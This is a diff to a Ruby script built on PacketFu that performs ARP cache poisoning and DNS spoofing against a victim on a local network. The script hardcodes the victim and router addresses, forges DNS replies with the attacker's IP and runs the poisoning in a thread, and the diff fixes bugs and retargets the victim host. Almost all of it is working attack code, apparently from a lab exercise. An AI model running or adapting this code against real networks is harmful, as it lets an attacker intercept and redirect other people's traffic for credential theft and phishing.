@@ -3,13 +3,14 @@ require 'rubygems'
 require 'packetfu'
 require 'thread'
 
+
 def initArpPackets(intface, victimIP)
 	@interface = intface
 	@victimIP = victimIP
 	@routerIP = "192.168.0.100"
 	@srcMAC = "78:2b:cb:a3:43:25" #	PacketFu::Utils.whoami?(:iface => @interface)
 	puts "mac addresses"
-	@victimMAC = "78:2b:cb:a3:eb:af" #PacketFu::Utils.arp(@victimIP, :iface => @interface)
+	@victimMAC = "78:2b:cb:a3:3f:85"#"78:2b:cb:a3:eb:af" #PacketFu::Utils.arp(@victimIP, :iface => @interface)
 	@routerMAC = "00:1a:6d:38:15:ff" #PacketFu::Utils.arp(@routerIP, :iface => @interface)
 
 		puts "Constructing arp packets"
@@ -49,7 +50,7 @@ def revertArpPackets(intface, victimIP)
 	@routerIP = "192.168.0.100"
 	@srcMAC = "78:2b:cb:a3:43:25" #	PacketFu::Utils.whoami?(:iface => @interface)
 
-	@victimMAC = "78:2b:cb:a3:eb:af" #PacketFu::Utils.arp(@victimIP, :iface => @interface)
+	@victimMAC = "78:2b:cb:a3:3f:85"#"78:2b:cb:a3:eb:af" #PacketFu::Utils.arp(@victimIP, :iface => @interface)
 	@routerMAC = "00:1a:6d:38:15:ff" #PacketFu::Utils.arp(@routerIP, :iface => @interface)
 
 	#Construct the target's packet
@@ -85,12 +86,13 @@ def sendResponse(packet, domainName)
 	myIP2 = [myIP[0].to_i, myIP[1].to_i, myIP[2].to_i, myIP[3].to_i].pack('c*')
 
 	# Create the UDP packet
-	response = UDPPacket.new()#:config => @srcInfo)
+	response = PacketFu::UDPPacket.new()#:config => @srcInfo)
 	response.udp_src = packet.udp_dst
 	response.udp_dst = packet.udp_src
 	response.ip_saddr = packet.ip_daddr
 	response.ip_daddr = @victimIP
 	response.eth_daddr = @victimMAC
+	response.eth_saddr = @srcMAC
 
 	# Transaction ID
 	response.payload = packet.payload[0,2]
@@ -123,22 +125,25 @@ def getDomainName(rawDomain)
         while true
             
             # Get the length of the next section of the domain name
-            length = rawDomain[0].to_i
-            puts "%i" % length
-            if length == 0
-                # We have all the sections, so send it back
-                return domainName = domainName[0, domainName.length - 1]
-            elsif length != 0
-                # Copy the section of the domain name over
-                domainName += rawDomain[1, length] + "."
-                rawDomain = rawDomain[length + 1..-1]
-            else
+        	length = rawDomain[0].unpack('C')
 
-                # Malformed packet!
-                return nil
-            end
-        end
-    end
+		length =  "%i" %length
+		length = length.to_i
+
+		if length == 0
+			# We have all the sections, so send it back
+			return domainName = domainName[0, domainName.length - 1]
+		elsif length != 0
+
+			# Copy the section of the domain name over
+			domainName += rawDomain[1, length] + "."
+			rawDomain = rawDomain[length + 1..-1]
+		else
+			# Malformed packet!
+			return nil
+		end
+	end
+end
 
 def initDns(intface, victimIP)
 	iface = intface
@@ -184,9 +189,9 @@ begin
 
 
 	puts "Starting the ARP poisoning thread..."
-	spoof_thread = Thread.new{initArpPackets("em1","192.168.0.1")} 
+	spoof_thread = Thread.new{initArpPackets("em1","192.168.0.3")} 
 	#dns_thread = Thread.new{initDns("em1","192.168.0.1")} 
-initDns("em1","192.168.0.1")	
+initDns("em1","192.168.0.3")	
 spoof_thread.join
 	#dns_thread.join
 	
@@ -197,7 +202,7 @@ spoof_thread.join
 	puts "\nDNS spoof stopped by interrupt signal."
 	Thread.kill(spoof_thread)
 		
-	revertArpPackets("em1","192.168.0.1")
+	revertArpPackets("em1","192.168.0.3")
 	#Thread.kill(dns_thread)
 	`echo 0 > /proc/sys/net/ipv4/ip_forward`
 	exit 0
